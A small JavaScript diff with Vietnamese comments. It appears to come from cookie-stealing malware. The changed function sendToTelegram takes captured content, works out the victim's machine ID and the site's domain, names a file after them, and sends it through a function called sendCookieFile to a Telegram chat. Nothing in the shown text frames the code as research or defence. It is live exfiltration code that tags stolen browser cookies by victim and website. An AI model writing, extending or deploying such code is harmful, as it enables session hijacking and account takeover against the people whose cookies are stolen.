@@ -75,9 +75,13 @@ async function sendToTelegram(content) {
     }
 
     try {
-      // Lấy machine ID
+      // Lấy machine ID và domain từ content
       const machineId = await getMachineId();
-      const filename = `machine_${machineId}.txt`;
+      const urlMatch = content.match(/URL: (.*?)\n/);
+      const contentUrl = urlMatch ? urlMatch[1] : '';
+      const domain = contentUrl.match(/(?:https?:\/\/)?(?:www\.)?([^\/]+)/i);
+      const domainName = domain ? domain[1] : 'unknown';
+      const filename = `${machineId}_${domainName}.txt`;
       const formData = await sendCookieFile(content, filename);
       formData.append('chat_id', result.telegram_chat_id);
 
